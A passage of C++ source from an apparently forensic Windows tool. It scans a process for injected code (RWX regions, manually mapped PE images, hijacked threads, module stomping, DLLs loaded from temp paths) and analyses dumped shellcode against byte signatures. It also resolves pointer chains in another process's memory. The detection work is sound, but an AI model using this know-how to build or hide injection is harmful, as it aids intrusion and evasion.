            if(mem[k]!=fbuf[k]){
                diff++;
                if(firstDiff==(size_t)-1)firstDiff=k;
                curRun++; if(curRun>maxRun)maxRun=curRun;
            } else curRun=0;
        }
        bool suspicious=(diff*20>cmp)||maxRun>32;
        if(diff==0)continue;
        char secName[9]={}; memcpy(secName,s.Name,8);
        char line[640];
        sprintf_s(line,"  %s  %-24s %-8s diff=%zu/%lu (%.1f%%) maxRun=%zu  firstDiff=0x%llX",
            suspicious?"[SUSPICIOUS]":"[minor]   ",
            modName.c_str(),secName,diff,(unsigned long)cmp,
            100.0*(double)diff/(double)cmp,maxRun,
            (unsigned long long)((uintptr_t)modBase+s.VirtualAddress+firstDiff));
        AppendEditText(hLstDetect,line);
        if(suspicious)findingsAdded++;
    }
}

void RunInjectionDetection(){
    if(!hProcess||!currentPID){LogToStatus("Attach to a process first",true);return;}
    ClearEditText(hLstDetect);

    bool doRx     =SendMessage(hChkDetectRx,    BM_GETCHECK,0,0)==BST_CHECKED;
    bool doStomp  =SendMessage(hChkDetectStomp, BM_GETCHECK,0,0)==BST_CHECKED;
    bool doMapped =SendMessage(hChkDetectMapped,BM_GETCHECK,0,0)==BST_CHECKED;
    bool doThread =SendMessage(hChkDetectThread,BM_GETCHECK,0,0)==BST_CHECKED;
    bool doRwx    =SendMessage(hChkDetectRwx,   BM_GETCHECK,0,0)==BST_CHECKED;
    bool doManMap =SendMessage(hChkDetectManMap,BM_GETCHECK,0,0)==BST_CHECKED;
    bool doHijack =SendMessage(hChkDetectHijack,BM_GETCHECK,0,0)==BST_CHECKED;
    bool doPath   =SendMessage(hChkDetectPath,  BM_GETCHECK,0,0)==BST_CHECKED;

    char hdr[256];
    sprintf_s(hdr,"=== INJECTION DETECTION SCAN  PID=%d ===",currentPID);
    AppendEditText(hLstDetect,hdr);
    AppendEditText(hLstDetect,"");

    std::vector<ModRange> ranges;
    {
        HMODULE mods[1024]; DWORD needed=0;
        if(EnumProcessModules(hProcess,mods,sizeof(mods),&needed)){
            DWORD count=needed/sizeof(HMODULE);
            for(DWORD i=0;i<count&&i<1024;i++){
                MODULEINFO mi={};
                if(!GetModuleInformation(hProcess,mods[i],&mi,sizeof(mi)))continue;
                char modPath[MAX_PATH]={};
                GetModuleFileNameExA(hProcess,mods[i],modPath,MAX_PATH);
                const char* nm=strrchr(modPath,'\\'); nm=nm?nm+1:modPath;
                ModRange mr;
                mr.base=(uintptr_t)mi.lpBaseOfDll;
                mr.end =mr.base+mi.SizeOfImage;
                mr.name=nm;
                ranges.push_back(mr);
            }
        }
    }
    auto inAnyModule=[&](uintptr_t a)->const char*{
        for(auto& r:ranges)if(a>=r.base&&a<r.end)return r.name.c_str();
        return NULL;
    };

    int totalFindings=0;

    if(doRx||doMapped||doRwx){
        AppendEditText(hLstDetect,"--- [1] EXECUTABLE MEMORY REGIONS ---");
        AppendEditText(hLstDetect,"  Type   Protection    Base                 Size         Backing");
        SYSTEM_INFO si; GetSystemInfo(&si);
        LPVOID a=si.lpMinimumApplicationAddress;
        int n=0,flagged=0;
        while(a<si.lpMaximumApplicationAddress&&n<200000){
            MEMORY_BASIC_INFORMATION mbi;
            if(VirtualQueryEx(hProcess,a,&mbi,sizeof(mbi))!=sizeof(mbi))break;
            n++;
            if(mbi.State==MEM_COMMIT){
                bool exec=(mbi.Protect&(PAGE_EXECUTE|PAGE_EXECUTE_READ|PAGE_EXECUTE_READWRITE|PAGE_EXECUTE_WRITECOPY))!=0;
                if(exec){
                    bool flag=false; const char* why="";
                    bool rwx=(mbi.Protect&PAGE_EXECUTE_READWRITE)!=0;
                    if(doRwx && rwx){
                        flag=true;
                        if      (mbi.Type==MEM_IMAGE)   why="[!!] IMAGE+RWX  module page is RWX (very suspicious)";
                        else if (mbi.Type==MEM_PRIVATE) why="[!!] PRIVATE+RWX  shellcode write+exec region";
                        else if (mbi.Type==MEM_MAPPED)  why="[!!] MAPPED+RWX  RWX section-mapped";
                        else                            why="[!!] RWX  region is writable+executable";
                    }
                    else if(doRx&&mbi.Type==MEM_PRIVATE){flag=true; why="PRIVATE  shellcode-style region (no file backing)";}
                    else if(doMapped&&mbi.Type==MEM_MAPPED){flag=true; why="MAPPED   section-based map (NtMapViewOfSection-style)";}
                    if(flag){
                        const char* prot="EXEC";
                        if     (mbi.Protect&PAGE_EXECUTE_READWRITE)prot="EXEC+RW";
                        else if(mbi.Protect&PAGE_EXECUTE_WRITECOPY)prot="EXEC+WC";
                        else if(mbi.Protect&PAGE_EXECUTE_READ)     prot="EXEC+R";
                        else if(mbi.Protect&PAGE_EXECUTE)          prot="EXEC";
                        char fname[MAX_PATH]={};
                        DWORD fl=GetMappedFileNameA(hProcess,mbi.BaseAddress,fname,MAX_PATH);
                        const char* fb=fl?fname:"(none)";
                        char line[640];
                        sprintf_s(line,"  %s  0x%016llX  %10s   %s",
                            prot,(unsigned long long)(uintptr_t)mbi.BaseAddress,
                            FormatMemorySize(mbi.RegionSize).c_str(),why);
                        AppendEditText(hLstDetect,line);
                        char line2[640];
                        sprintf_s(line2,"         file: %s",fb);
                        AppendEditText(hLstDetect,line2);
                        flagged++; totalFindings++;
                    }
                }
            }
            a=(LPVOID)((uintptr_t)mbi.BaseAddress+mbi.RegionSize);
        }
        char sum[128];
        sprintf_s(sum,"  -> %d executable region(s) flagged out of %d total",flagged,n);
        AppendEditText(hLstDetect,sum);
        AppendEditText(hLstDetect,"");
    }

    if(doStomp){
        AppendEditText(hLstDetect,"--- [2] MODULE CODE INTEGRITY (.text divergence vs disk) ---");
        AppendEditText(hLstDetect,"  Note: a small number of byte differences is normal (IAT/hot-patch). Look for [SUSPICIOUS].");
        int suspBefore=totalFindings;
        for(auto& r:ranges){
            char modPath[MAX_PATH]={};
            HMODULE mh=(HMODULE)(uintptr_t)r.base;
            if(!GetModuleFileNameExA(hProcess,mh,modPath,MAX_PATH))continue;
            std::vector<BYTE> disk;
            if(!ReadDiskFileFully(modPath,disk))continue;
            int added=0;
            CompareExecSections((LPVOID)r.base,modPath,r.name,disk,added);
            totalFindings+=added;
        }
        char sum[128];
        sprintf_s(sum,"  -> %d module(s) with suspicious .text divergence",totalFindings-suspBefore);
        AppendEditText(hLstDetect,sum);
        AppendEditText(hLstDetect,"");
    }

    if(doThread){
        AppendEditText(hLstDetect,"--- [3] THREAD START ADDRESSES OUTSIDE ANY LOADED MODULE ---");
        HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
        int flagged=0,total=0;
        if(snap!=INVALID_HANDLE_VALUE){
            THREADENTRY32 te; te.dwSize=sizeof(te);
            typedef NTSTATUS(WINAPI*NtQIT)(HANDLE,int,PVOID,ULONG,PULONG);
            static NtQIT fn=(NtQIT)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQueryInformationThread");
            if(Thread32First(snap,&te)){
                do{
                    if(te.th32OwnerProcessID!=currentPID)continue;
                    total++;
                    PVOID sa=NULL;
                    HANDLE hTh=OpenThread(THREAD_QUERY_INFORMATION,FALSE,te.th32ThreadID);
                    if(hTh){
                        if(fn)fn(hTh,9,&sa,sizeof(sa),NULL);
                        CloseHandle(hTh);
                    }
                    if(!sa)continue;
                    const char* mod=inAnyModule((uintptr_t)sa);
                    if(!mod){
                        MEMORY_BASIC_INFORMATION mbi={};
                        const char* kind="UNKNOWN";
                        if(VirtualQueryEx(hProcess,sa,&mbi,sizeof(mbi))==sizeof(mbi)){
                            if(mbi.Type==MEM_PRIVATE)kind="PRIVATE";
                            else if(mbi.Type==MEM_MAPPED)kind="MAPPED";
                            else if(mbi.Type==MEM_IMAGE)kind="IMAGE(unlinked?)";
                        }
                        char line[256];
                        sprintf_s(line,"  [SUSPICIOUS] TID=%-8lu start=0x%p  region=%s  not in any loaded module",
                            te.th32ThreadID,sa,kind);
                        AppendEditText(hLstDetect,line);
                        flagged++; totalFindings++;
                    }
                }while(Thread32Next(snap,&te));
            }
            CloseHandle(snap);
        }
        char sum[128];
        sprintf_s(sum,"  -> %d/%d thread(s) with start address outside any loaded module",flagged,total);
        AppendEditText(hLstDetect,sum);
        AppendEditText(hLstDetect,"");
    }

    if(doManMap){
        AppendEditText(hLstDetect,"--- [4] MANUAL-MAPPED PE IMAGES (PE in memory not in module list) ---");
        AppendEditText(hLstDetect,"  Note: catches reflective loaders / manual mappers that bypass LoadLibrary.");
        AppendEditText(hLstDetect,"  Some legitimate runtimes (.NET dynamic assemblies) may also appear here.");
        SYSTEM_INFO si; GetSystemInfo(&si);
        LPVOID a=si.lpMinimumApplicationAddress;
        int n=0,flagged=0;
        while(a<si.lpMaximumApplicationAddress&&n<200000){
            MEMORY_BASIC_INFORMATION mbi;
            if(VirtualQueryEx(hProcess,a,&mbi,sizeof(mbi))!=sizeof(mbi))break;
            n++;
            if(mbi.State==MEM_COMMIT && mbi.Type!=MEM_IMAGE && mbi.RegionSize>=0x1000){
                uintptr_t base=(uintptr_t)mbi.BaseAddress;
                if(!inAnyModule(base)){
                    BYTE hdr[0x400]={};
                    SIZE_T r=0;
                    SIZE_T toRead=sizeof(hdr); if(toRead>mbi.RegionSize)toRead=mbi.RegionSize;
                    if(ReadProcessMemory(hProcess,(LPVOID)base,hdr,toRead,&r)&&r>=sizeof(IMAGE_DOS_HEADER)){
                        IMAGE_DOS_HEADER* dos=(IMAGE_DOS_HEADER*)hdr;
                        if(dos->e_magic==IMAGE_DOS_SIGNATURE && dos->e_lfanew>0 &&
                           (size_t)dos->e_lfanew+sizeof(IMAGE_NT_HEADERS)<=r){
                            IMAGE_NT_HEADERS* nt=(IMAGE_NT_HEADERS*)(hdr+dos->e_lfanew);
                            if(nt->Signature==IMAGE_NT_SIGNATURE){
                                const char* tstr=mbi.Type==MEM_PRIVATE?"PRIVATE":(mbi.Type==MEM_MAPPED?"MAPPED":"OTHER");
                                char line[320];
                                sprintf_s(line,"  [SUSPICIOUS] PE image at 0x%016llX  size=%s  type=%s  not in loaded module list",
                                    (unsigned long long)base,
                                    FormatMemorySize(mbi.RegionSize).c_str(), tstr);
                                AppendEditText(hLstDetect,line);
                                flagged++; totalFindings++;
                            }
                        }
                    }
                }
            }
            a=(LPVOID)((uintptr_t)mbi.BaseAddress+mbi.RegionSize);
        }
        char sum[128];
        sprintf_s(sum,"  -> %d manually-mapped PE image(s) detected",flagged);
        AppendEditText(hLstDetect,sum);
        AppendEditText(hLstDetect,"");
    }

    if(doHijack){
        AppendEditText(hLstDetect,"--- [5] THREAD CONTEXT HIJACK CHECK (current RIP outside any module) ---");
        AppendEditText(hLstDetect,"  Note: briefly suspends each thread to read its context. Avoid on system-critical processes.");
        HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
        int flagged=0,total=0;
        if(snap!=INVALID_HANDLE_VALUE){
            THREADENTRY32 te; te.dwSize=sizeof(te);
            if(Thread32First(snap,&te)){
                do{
                    if(te.th32OwnerProcessID!=currentPID)continue;
                    total++;
                    HANDLE hTh=OpenThread(THREAD_GET_CONTEXT|THREAD_SUSPEND_RESUME|THREAD_QUERY_INFORMATION,FALSE,te.th32ThreadID);
                    if(!hTh)continue;
                    DWORD prev=SuspendThread(hTh);
                    if(prev==(DWORD)-1){CloseHandle(hTh);continue;}
                    CONTEXT ctx={}; ctx.ContextFlags=CONTEXT_CONTROL;
                    BOOL ok=GetThreadContext(hTh,&ctx);
                    ResumeThread(hTh);
                    if(ok){
#ifdef _WIN64
                        uintptr_t rip=(uintptr_t)ctx.Rip;
#else
                        uintptr_t rip=(uintptr_t)ctx.Eip;
#endif
                        if(rip && !inAnyModule(rip)){
                            MEMORY_BASIC_INFORMATION mbi={};
                            const char* kind="UNKNOWN";
                            if(VirtualQueryEx(hProcess,(LPVOID)rip,&mbi,sizeof(mbi))==sizeof(mbi)){
                                if      (mbi.Type==MEM_PRIVATE) kind="PRIVATE";
                                else if (mbi.Type==MEM_MAPPED)  kind="MAPPED";
                                else if (mbi.Type==MEM_IMAGE)   kind="IMAGE(unlinked?)";
                            }
                            char line[256];
                            sprintf_s(line,"  [SUSPICIOUS] TID=%-8lu RIP=0x%016llX  region=%s  outside loaded modules (possible hijack)",
                                te.th32ThreadID,(unsigned long long)rip,kind);
                            AppendEditText(hLstDetect,line);
                            flagged++; totalFindings++;
                        }
                    }
                    CloseHandle(hTh);
                }while(Thread32Next(snap,&te));
            }
            CloseHandle(snap);
        }
        char sum[128];
        sprintf_s(sum,"  -> %d/%d thread(s) executing outside any loaded module",flagged,total);
        AppendEditText(hLstDetect,sum);
        AppendEditText(hLstDetect,"");
    }

    if(doPath){
        AppendEditText(hLstDetect,"--- [6] MODULES LOADED FROM SUSPICIOUS PATHS ---");
        auto containsCI=[](const char* s,const char* sub)->bool{
            if(!s||!sub)return false;
            size_t sl=strlen(s),tl=strlen(sub);
            if(tl==0||tl>sl)return false;
            for(size_t i=0;i+tl<=sl;i++){
                bool m=true;
                for(size_t j=0;j<tl;j++){
                    char a=s[i+j],b=sub[j];
                    if(a>='A'&&a<='Z')a+=32;
                    if(b>='A'&&b<='Z')b+=32;
                    if(a!=b){m=false;break;}
                }
                if(m)return true;
            }
            return false;
        };
        int flagged=0;
        for(auto& r:ranges){
            char modPath[MAX_PATH]={};
            HMODULE mh=(HMODULE)(uintptr_t)r.base;
            if(!GetModuleFileNameExA(hProcess,mh,modPath,MAX_PATH))continue;
            const char* hit=NULL;
            if      (containsCI(modPath,"\\AppData\\Local\\Temp\\")) hit="AppData\\Local\\Temp";
            else if (containsCI(modPath,"\\Temp\\"))                 hit="Temp";
            else if (containsCI(modPath,"\\Downloads\\"))            hit="Downloads";
            else if (containsCI(modPath,"\\Users\\Public\\"))        hit="Users\\Public";
            else if (containsCI(modPath,"\\ProgramData\\"))          hit="ProgramData";
            else if (containsCI(modPath,"\\AppData\\Roaming\\"))     hit="AppData\\Roaming";
            if(hit){
                char line[640];
                sprintf_s(line,"  [SUSPICIOUS] %-24s loaded from %s",r.name.c_str(),hit);
                AppendEditText(hLstDetect,line);
                char line2[MAX_PATH+32];
                sprintf_s(line2,"           path: %s",modPath);
                AppendEditText(hLstDetect,line2);
                flagged++; totalFindings++;
            }
        }
        char sum[128];
        sprintf_s(sum,"  -> %d module(s) loaded from suspicious paths",flagged);
        AppendEditText(hLstDetect,sum);
        AppendEditText(hLstDetect,"");
    }

    AppendEditText(hLstDetect,"=== SCAN COMPLETE ===");
    char done[128];
    sprintf_s(done,"Detection scan: %d total finding(s).",totalFindings);
    LogToStatus(done);
}

static HMODULE FindModuleByPath(DWORD pid, const char* fullPath) {
    HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!h) return NULL;
    HMODULE mods[1024];
    DWORD needed;
    if (EnumProcessModulesEx(h, mods, sizeof(mods), &needed, LIST_MODULES_ALL)) {
        DWORD count = needed / sizeof(HMODULE);
        for (DWORD i = 0; i < count; i++) {
            char path[MAX_PATH];
            if (GetModuleFileNameExA(h, mods[i], path, MAX_PATH)) {
                if (_stricmp(path, fullPath) == 0) {
                    CloseHandle(h);
                    return mods[i];
                }
            }
        }
    }
    CloseHandle(h);
    return NULL;
}

static DWORD GetExportRVA(const char* dllPath, const char* funcName) {
    HMODULE hLocal = LoadLibraryExA(dllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hLocal) return 0;
    FARPROC localAddr = GetProcAddress(hLocal, funcName);
    if (!localAddr) {
        FreeLibrary(hLocal);
        return 0;
    }
    HMODULE localBase = GetModuleHandleA(dllPath);
    if (!localBase) localBase = hLocal;
    DWORD rva = (DWORD)((uintptr_t)localAddr - (uintptr_t)localBase);
    FreeLibrary(hLocal);
    return rva;
}

static int DisasmOne(const BYTE* b, size_t left, uint64_t rva, char* out, size_t outSz) {
    if (left == 0 || !out || outSz < 2) return 0;

    static ZydisDecoder   s_decoder;
    static ZydisFormatter s_formatter;
    static bool           s_init = false;
    if (!s_init) {
        if (!ZYAN_SUCCESS(ZydisDecoderInit(&s_decoder,
                ZYDIS_MACHINE_MODE_LONG_64, ZYDIS_STACK_WIDTH_64))) {
            sprintf_s(out, outSz, "db 0x%02X", b[0]);
            return 1;
        }
        if (!ZYAN_SUCCESS(ZydisFormatterInit(&s_formatter,
                ZYDIS_FORMATTER_STYLE_INTEL))) {
            sprintf_s(out, outSz, "db 0x%02X", b[0]);
            return 1;
        }

        ZyanU64 enable = ZYAN_TRUE;
        ZydisFormatterSetProperty(&s_formatter,
            ZYDIS_FORMATTER_PROP_FORCE_RELATIVE_BRANCHES, ZYAN_FALSE);
        ZydisFormatterSetProperty(&s_formatter,
            ZYDIS_FORMATTER_PROP_HEX_UPPERCASE, enable);
        s_init = true;
    }

    ZydisDecodedInstruction ins;
    ZydisDecodedOperand     ops[ZYDIS_MAX_OPERAND_COUNT];
    ZyanStatus st = ZydisDecoderDecodeFull(&s_decoder, b, left, &ins, ops);
    if (!ZYAN_SUCCESS(st)) {
        sprintf_s(out, outSz, "db 0x%02X", b[0]);
        return 1;
    }
    if (!ZYAN_SUCCESS(ZydisFormatterFormatInstruction(&s_formatter, &ins, ops,
            ins.operand_count_visible, out, outSz, rva, ZYAN_NULL))) {
        sprintf_s(out, outSz, "db 0x%02X", b[0]);
        return 1;
    }
    return (int)ins.length;
}

struct ScPattern {
    const char* name;
    const char* desc;
    std::vector<BYTE> bytes;
    std::vector<bool> mask;  
};

static std::vector<ScPattern> BuildPatterns() {
    std::vector<ScPattern> p;
    p.push_back({"PEB_WALK_GS60","mov rax/rcx, gs:[0x60]  (PEB base via TEB)",
        {0x65,0x48,0x8B,0x04,0x25,0x60,0x00,0x00,0x00},{false,false,false,false,false,false,false,false,false}});
    p.push_back({"SYSCALL","Raw syscall instruction  (direct kernel call)",
        {0x0F,0x05},{false,false}});
    p.push_back({"SYSCALL_MOV_EAX","mov eax, imm32 + syscall  (syscall stub)",
        {0xB8,0x00,0x00,0x00,0x00,0x0F,0x05},{false,true,true,true,true,false,false}});
    p.push_back({"PUSH_PAGE_RWX","push 0x40  (PAGE_EXECUTE_READWRITE flag)",
        {0x6A,0x40},{false,false}});
    p.push_back({"PUSH_MEM_COMMIT","push 0x1000  (MEM_COMMIT flag)",
        {0x68,0x00,0x10,0x00,0x00},{false,false,false,false,false}});
    p.push_back({"CALL_RAX","call rax  (API dispatch via register)",
        {0xFF,0xD0},{false,false}});
    p.push_back({"JMP_RAX","jmp rax",
        {0xFF,0xE0},{false,false}});
    p.push_back({"XOR_DECODE","xor [rsi+rbx], al  (XOR decode loop)",
        {0x30,0x04,0x1E},{false,false,false}});
    p.push_back({"INT3","int3  (breakpoint / possible padding)",
        {0xCC},{false}});
    p.push_back({"STACK_STRING","Stack string construction pattern",
        {0x48,0xB8},{false,false}});  
    p.push_back({"ROR13_HASH","ror ?, 13  (ROR13 API hashing)",
        {0xC1,0x00,0x0D},{false,true,false}}); 
    p.push_back({"SHADOW_SPACE","sub rsp, 0x28  (shadow space allocation)",
        {0x48,0x83,0xEC,0x28},{false,false,false,false}});
    p.push_back({"SHADOW_SPACE_38","sub rsp, 0x38  (shadow space allocation)",
        {0x48,0x83,0xEC,0x38},{false,false,false,false}});
    return p;
}

void AnalyzeDumpShellcode() {
    int len = GetWindowTextLengthA(hEditDump);
    if (len <= 0) { LogToStatus("Dump panel is empty - run Dump Selected first", true); return; }
    std::string raw(len+1, '\0');
    GetWindowTextA(hEditDump, &raw[0], len+1);

    std::vector<BYTE> bytes;
    uint64_t baseAddr = 0;
    {
        const char* p = raw.c_str();
        uint64_t firstAddr = strtoull(p, nullptr, 16);
        if (firstAddr) baseAddr = firstAddr;
        while (*p) {
            const char* colon = strchr(p, ':');
            if (!colon) { p += strlen(p); break; }
            p = colon + 1;
            for (int i = 0; i < 16; i++) {
                while (*p == ' ') p++;
                if (*p == '\0' || *p == '\r' || *p == '\n' || *p == '|') break;
                char* end = nullptr;
                unsigned long v = strtoul(p, &end, 16);
                if (end == p || end - p > 2) break;
                bytes.push_back((BYTE)v);
                p = end;
            }
            while (*p && *p != '\n') p++;
            if (*p == '\n') p++;
        }
    }

    if (bytes.empty()) {
        LogToStatus("Could not parse hex bytes from dump. Use 'Dump Selected' first.", true);
        return;
    }

    ClearEditText(hEditDump);
    char hdr[256];
    sprintf_s(hdr, "=== SHELLCODE ANALYSIS  |  %zu bytes @ 0x%llX ===",
        bytes.size(), (unsigned long long)baseAddr);
    AppendEditText(hEditDump, hdr);
    AppendEditText(hEditDump, "");

    AppendEditText(hEditDump, "--- PATTERN SIGNATURES ---");
    auto patterns = BuildPatterns();
    int sigHits = 0;
    for (auto& pat : patterns) {
        size_t plen = pat.bytes.size();
        for (size_t i = 0; i + plen <= bytes.size(); i++) {
            bool match = true;
            for (size_t k = 0; k < plen; k++) {
                if (!pat.mask[k] && bytes[i+k] != pat.bytes[k]) { match = false; break; }
            }
            if (match) {
                char line[256];
                sprintf_s(line, "  [+0x%03zX]  %-24s  %s", i, pat.name, pat.desc);
                AppendEditText(hEditDump, line);
                sigHits++;
            }
        }
    }
    if (sigHits == 0) AppendEditText(hEditDump, "  (no known signatures found)");

    AppendEditText(hEditDump, "");
    AppendEditText(hEditDump, "--- ENTROPY / STATISTICS ---");
    {
        int freq[256] = {};
        for (BYTE b : bytes) freq[b]++;
        double ent = 0.0;
        for (int i = 0; i < 256; i++) {
            if (freq[i] == 0) continue;
            double p = (double)freq[i] / bytes.size();
            ent -= p * log(p) / log(2.0);
        }
        int zeros = freq[0], nops = freq[0x90], rets = freq[0xC3];
        int printable = 0;
        for (BYTE b : bytes) if (b >= 0x20 && b < 0x7F) printable++;
        char line[256];
        sprintf_s(line, "  Size: %zu bytes  |  Entropy: %.2f bits  |  Zeros: %d  |  NOPs: %d  |  RETs: %d  |  Printable: %d%%",
            bytes.size(), ent, zeros, nops, rets, (int)(100.0*printable/bytes.size()));
        AppendEditText(hEditDump, line);
        if (ent > 7.0)  AppendEditText(hEditDump, "  [!!] HIGH ENTROPY - possibly encoded/encrypted payload");
        if (ent < 3.5 && bytes.size() > 32)
                        AppendEditText(hEditDump, "  [  ] LOW ENTROPY  - mostly NOP/zero padding or simple stub");
        if ((double)printable / bytes.size() > 0.75)
                        AppendEditText(hEditDump, "  [!!] HIGH printable ratio - may be string data or ASCII shellcode");
    }

    AppendEditText(hEditDump, "");
    AppendEditText(hEditDump, "--- EMBEDDED STRINGS (ASCII >= 5 chars) ---");
    {
        std::string cur;
        int strCount = 0;
        for (size_t i = 0; i <= bytes.size(); i++) {
            BYTE b = (i < bytes.size()) ? bytes[i] : 0;
            if (b >= 0x20 && b < 0x7F) {
                cur += (char)b;
            } else {
                if (cur.size() >= 5) {
                    char line[512];
                    sprintf_s(line, "  [+0x%03zX]  \"%s\"", i - cur.size(), cur.c_str());
                    AppendEditText(hEditDump, line);
                    strCount++;
                }
                cur.clear();
            }
        }
        if (strCount == 0) AppendEditText(hEditDump, "  (none found)");
    }

    AppendEditText(hEditDump, "");
    AppendEditText(hEditDump, "--- EMBEDDED STRINGS (UTF-16LE >= 5 chars) ---");
    {
        int strCount = 0;
        for (size_t i = 0; i + 1 < bytes.size(); ) {
            wchar_t wc = *(wchar_t*)&bytes[i];
            if (wc >= 0x20 && wc < 0x7F) {
                std::string cur;
                size_t start = i;
                while (i + 1 < bytes.size()) {
                    wchar_t w = *(wchar_t*)&bytes[i];
                    if (w < 0x20 || w >= 0x7F) break;
                    cur += (char)w;
                    i += 2;
                }
                if (cur.size() >= 5) {
                    char line[512];
                    sprintf_s(line, "  [+0x%03zX]  L\"%s\"", start, cur.c_str());
                    AppendEditText(hEditDump, line);
                    strCount++;
                }
            } else { i++; }
        }
        if (strCount == 0) AppendEditText(hEditDump, "  (none found)");
    }

    AppendEditText(hEditDump, "");
    AppendEditText(hEditDump, "--- DISASSEMBLY (x64) ---");
    AppendEditText(hEditDump, "  Offset  | Address            | Bytes                     | Instruction");
    AppendEditText(hEditDump, "  --------+--------------------+---------------------------+---------------------------");
    {
        size_t pos = 0;
        int instrCount = 0;
        int maxInstr = 512;
        while (pos < bytes.size() && instrCount < maxInstr) {
            char instr[256] = {};
            size_t left = bytes.size() - pos;
            uint64_t rva = baseAddr + pos;
            int consumed = DisasmOne(bytes.data() + pos, left, rva, instr, sizeof(instr));
            if (consumed <= 0) consumed = 1;

            char hexcol[48] = {};
            int hpos = 0;
            for (int i = 0; i < consumed && i < 8; i++) {
                sprintf_s(hexcol + hpos, sizeof(hexcol) - hpos, "%02X ", bytes[pos+i]);
                hpos += 3;
            }
            if (consumed > 8) strcat_s(hexcol, "...");

            const char* flag = "";
            if (strstr(instr,"syscall"))     flag = "  <--- SYSCALL";
            else if (strstr(instr,"int3"))   flag = "  <--- BREAKPOINT";
            else if (strstr(instr,"gs:"))    flag = "  <--- TEB/PEB ACCESS";
            else if (strstr(instr,"call"))   flag = "  <--- CALL";
            else if (strstr(instr,"0x40"))   flag = "  (PAGE_RWX?)";

            char line[512];
            sprintf_s(line, "  +0x%04zX | 0x%016llX | %-27s| %s%s",
                pos, (unsigned long long)rva, hexcol, instr, flag);
            AppendEditText(hEditDump, line);

            pos += consumed;
            instrCount++;
        }
        if (pos < bytes.size()) {
            char more[64];
            sprintf_s(more, "  ... (%zu bytes remaining, limit %d instrs)", bytes.size()-pos, maxInstr);
            AppendEditText(hEditDump, more);
        }
    }

    AppendEditText(hEditDump, "");
    AppendEditText(hEditDump, "=== END OF ANALYSIS ===");
    char done[128];
    sprintf_s(done, "Shellcode analysis complete: %zu bytes, %d signature(s) found", bytes.size(), sigHits);
    LogToStatus(done);
}



LPVOID ResolveChain(const PointerChain& c, bool& ok) {
    ok = false;
    if (!hProcess) return nullptr;
    uintptr_t modBase = 0;
    if (c.moduleName.empty()) {
        modBase = (uintptr_t)GetBaseAddress();
    } else {
        HMODULE mods[1024]; DWORD needed = 0;
        if (!EnumProcessModules(hProcess, mods, sizeof(mods), &needed)) return nullptr;
        DWORD cnt = needed / sizeof(HMODULE);
        for (DWORD i = 0; i < cnt; i++) {
            char path[MAX_PATH] = {};
            if (!GetModuleFileNameExA(hProcess, mods[i], path, MAX_PATH)) continue;
            const char* nm = strrchr(path, '\\'); nm = nm ? nm + 1 : path;
            if (_stricmp(nm, c.moduleName.c_str()) == 0) {
                modBase = (uintptr_t)mods[i];
                break;
            }
        }
    }
    if (!modBase) return nullptr;
    uintptr_t cur = modBase + c.baseOffset;
    for (size_t i = 0; i < c.offsets.size(); i++) {
        uintptr_t ptr = 0;
        SIZE_T r = 0;
        if (!ReadProcessMemory(hProcess, (LPCVOID)cur, &ptr, sizeof(ptr), &r) || r != sizeof(ptr))
            return nullptr;
        cur = ptr + c.offsets[i];
    }
    ok = true;
    return (LPVOID)cur;
}

void RefreshChainsUI() {
    if (!hLstChains) return;
    ClearEditText(hLstChains);
    AppendEditText(hLstChains, "Idx  Name                     Module           Base+Offset       Chain                          Resolved             Value");
    AppendEditText(hLstChains, "-----+------------------------+----------------+------------------+-------------------------------+---------------------+--------");
    for (int i = 0; i < (int)g_chains.size(); i++) {
        PointerChain& c = g_chains[i];
        bool ok = false;
        LPVOID resolved = ResolveChain(c, ok);
        c.lastResolved = (uintptr_t)resolved;
        c.lastOk = ok;
        c.lastValue = 0;
        if (ok && resolved && hProcess) {
            SIZE_T r; ReadProcessMemory(hProcess, resolved, &c.lastValue, 4, &r);
        }
        std::string offStr;
        for (size_t k = 0; k < c.offsets.size(); k++) {
            char b[32]; sprintf_s(b, k ? ",+0x%llX" : "+0x%llX", (unsigned long long)c.offsets[k]);
            offStr += b;
        }
        if (offStr.empty()) offStr = "(direct)";
        char line[768];
        if (ok && resolved) {
            sprintf_s(line, "[%2d] %-24s %-16s 0x%-16llX %-31s 0x%016llX  %d",
                i, c.name.c_str(),
                c.moduleName.empty() ? "(main)" : c.moduleName.c_str(),
                (unsigned long long)c.baseOffset, offStr.c_str(),
                (unsigned long long)(uintptr_t)resolved, c.lastValue);
        } else {
            sprintf_s(line, "[%2d] %-24s %-16s 0x%-16llX %-31s (unresolved)",
                i, c.name.c_str(),
                c.moduleName.empty() ? "(main)" : c.moduleName.c_str(),
                (unsigned long long)c.baseOffset, offStr.c_str());
        }
        AppendEditText(hLstChains, line);
    }
}

void AddChainFromUI() {
    char name[128] = {}, mod[128] = {}, base[64] = {}, offs[512] = {};
    GetWindowTextA(hEditChainName, name, sizeof(name));
    GetWindowTextA(hEditChainMod,  mod,  sizeof(mod));
    GetWindowTextA(hEditChainBase, base, sizeof(base));
    GetWindowTextA(hEditChainOffs, offs, sizeof(offs));
    if (!name[0]) { LogToStatus("Enter a chain name first", true); return; }
    PointerChain c;
    c.name = name;
    c.moduleName = mod;
    c.baseOffset = strtoull(base, nullptr, 0);
    char* save = nullptr;
    char* tok = strtok_s(offs, ",;", &save);
    while (tok) {
        while (*tok == ' ') tok++;
        if (*tok) c.offsets.push_back((intptr_t)strtoll(tok, nullptr, 0));
        tok = strtok_s(nullptr, ",;", &save);
    }
    g_chains.push_back(c);
    RefreshChainsUI();
    LogToStatus("Pointer chain added");
}

void DeleteSelectedChain() {
    DWORD sel = 0;
    SendMessage(hLstChains, EM_GETSEL, (WPARAM)&sel, 0);
    int li = (int)SendMessage(hLstChains, EM_LINEFROMCHAR, (WPARAM)sel, 0);
    int idx = li - 2; 
    if (idx < 0 || idx >= (int)g_chains.size()) { LogToStatus("Click a chain line first", true); return; }
    g_chains.erase(g_chains.begin() + idx);
    RefreshChainsUI();
    LogToStatus("Chain deleted");
}

void ResolveChainToSelected() {
    DWORD sel = 0;
    SendMessage(hLstChains, EM_GETSEL, (WPARAM)&sel, 0);
    int li = (int)SendMessage(hLstChains, EM_LINEFROMCHAR, (WPARAM)sel, 0);
    int idx = li - 2;
